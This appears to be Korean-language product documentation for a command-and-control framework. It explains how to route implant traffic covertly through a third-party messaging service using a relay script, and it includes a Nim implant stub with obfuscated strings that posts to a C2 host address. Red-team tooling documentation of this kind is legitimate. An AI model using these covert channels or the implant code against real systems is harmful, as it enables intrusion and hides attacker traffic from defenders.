## 동작 방식

커스텀 채널을 만들려면 구성 요소가 어떻게 맞물리는지 간단히 이해하는 것이 도움이 됩니다. 기본적으로 세 가지 기둥이 있습니다.

1. HTTP 리스너
2. 커스텀 채널을 사용하는 임플란트
3. 커스텀 스크립트

이들이 함께 임플란트와 팀 서버 사이의 통신을 전달하며, 임플란트는 선택한 승인된 서드파티 서비스 외에는 요청을 보내지 않습니다.

흐름은 아래 다이어그램과 같아야 합니다.

### ( 2 ) 리스너

HTTP 리스너가 구성되어 있어야 합니다. 팀 서버 API를 사용할 수도 있지만, 설명을 명확하고 실용적으로 유지하기 위해 예제에서는 HTTP 리스너를 사용합니다.

### ( 3 ) 커스텀 스크립트

가장 중요한 단계 중 하나입니다. 선택한 서드파티 서비스와 리스너 양쪽과 통신하는 스크립트를 작성하며, 일종의 "번역" 역할을 합니다.

### ( 4 ) 서드파티 플랫폼

외부 통신 채널로 선택한 플랫폼입니다.

### ( 5 ) 임플란트

컴파일 시점부터 커스텀 통신 로직이 포함된 임플란트입니다.

## 통신 흐름

구조를 파악했으면 Telegram과 유사한 외부 메시징 플랫폼을 사용하는 시나리오를 따라가기가 더 쉽습니다.

  <Steps>
    <Step>
      `whoami` 명령이 큐에 전송됩니다.
    </Step>
    <Step>
      커스텀 스크립트는 5초마다 리스너와 통신하는 루프를 실행하여 명령을 가져옵니다. 명령을 찾으면 외부 서비스로 요청을 보냅니다. 예:

      ```
      input | 938192 | whoami
      ```
    </Step>
    <Step>
      외부 서비스에 동일한 내용의 메시지가 표시됩니다.
    </Step>
    <Step>
      임플란트는 해당 외부 서비스로 자체 요청을 이미 보내며, 인증 및 트래픽 전송에 필요한 API 키와 토큰을 갖고 있습니다. 각 요청마다 대기 중인 명령이 있는지 확인하고, 찾으면 명령을 실행합니다.

      그다음 결과를 외부 서비스로 보내는 요청을 보냅니다. 예:

      ```
      output | 938192 | whoami | root
      ```
    </Step>
    <Step>
      커스텀 스크립트의 루프 중 하나에서 해당 출력을 확인하고, [임플란트 API](/docs/rest-api/implants)의 통신 형식에 따라 마치 임플란트 자신인 것처럼 리스너에 요청을 보냅니다. 그 후 외부 서비스에서 해당 내용을 제거합니다.
    </Step>
    <Step>
      리스너가 요청을 받아 임플란트 트래픽으로 처리하고 명령을 완료합니다.
    </Step>
  </Steps>

## 커스텀 스크립트

특별한 비밀은 없습니다. 루프를 돌며 선택한 외부 서비스를 감시하고 트래픽을 리스너로 전달하는 스크립트를 직접 작성해야 합니다. 목적에 따라 여기서 복잡도가 커질 수 있으며, 특히 매우 큰 출력이나 입력을 분할할 때 그렇습니다.

## 커스텀 채널

앞서 말했듯이, 임플란트는 선택한 서비스에 맞는 통신 로직으로 빌드되어야 하므로 커스텀 코드를 작성해야 하며, 때로는 처음부터 시작해야 합니다.

임플란트 생성 중 커스텀 채널에 도달하려면 **명령 및 제어(Command and control)**를 연 다음 **채널(CHANNEL)** 아래 **커스텀 채널(Custom channel)**을 선택하세요.

바로 아래에 다음과 같은 코드 스텁이 담긴 텍스트 영역이 나타납니다.

```nim

# imports...

var customServerHost = obf("http://192.168.15.10:9090/")
const delaySeconds = 2
customCookies = toTable([
  (obf("session"), obf("example")),
  (obf("token"), obf("example")),
])
customHeaders = toTable([
  (obf("User-Agent"), obf("Mozilla/5.0")),
  (obf("X-Custom-Header"), obf("example")),
])

proc httpPost(
    url, payload: string;
    cookies: Table[string, string];
    headers: Table[string, string]
): tuple[code: uint16, body: string] =
  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
  for key, value in headers:
    pairs.add((key, value))
  var cookieParts: seq[string] = @[]
  for key, value in cookies:
    cookieParts.add(key & obf("=") & value)
  if cookieParts.len > 0:
    pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
  let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
  (code: r.code, body: r.body)

# Rest of the code...
```

이것은 기본 HTTP 통신을 절차형 형태로 옮긴 것에 불과하며, 더 쉽게 커스터마이즈할 수 있습니다. 필요에 맞게 이 로직을 변경할 수 있습니다.

더 복잡한 경우 분할, 암호화 등을 위한 추가 헬퍼를 넣을 수 있습니다.

## 릴레이 및 피벗

이 부분은 튜닝하기 번거롭지만 필요합니다. **임플란트 루틴(Implant routine)** 탭 옆에 **릴레이 포워더(Relay forwarder)**가 보이며, 아웃바운드 릴레이가 사용하는 로직입니다.

릴레이를 구성하면 항상 팀 서버로 트래픽을 보내는 마지막 릴레이가 있으며, 그 트래픽은 HTTP 요청과 JSON 형태로 만들어져야 합니다. 이 코드 블록이 그 역할을 담당합니다. 따라서 커스텀 채널과 함께 릴레이를 쓰려면 이 부분도 조정해야 합니다.

다행히 **임플란트 루틴(Implant routine)**의 로직을 **릴레이 포워더(Relay forwarder)**에 맞게 적용하는 경우가 많습니다.

## 테스트의 연속

커스텀 채널 구축은 지루하고 복잡할 수 있으므로, 운영 환경에 의존하기 전에 전체 로직을 테스트할 것을 권장합니다. 임플란트를 빌드할 때마다 로직이 잘못되면 예외가 발생하므로 개발이 훨씬 수월해집니다.
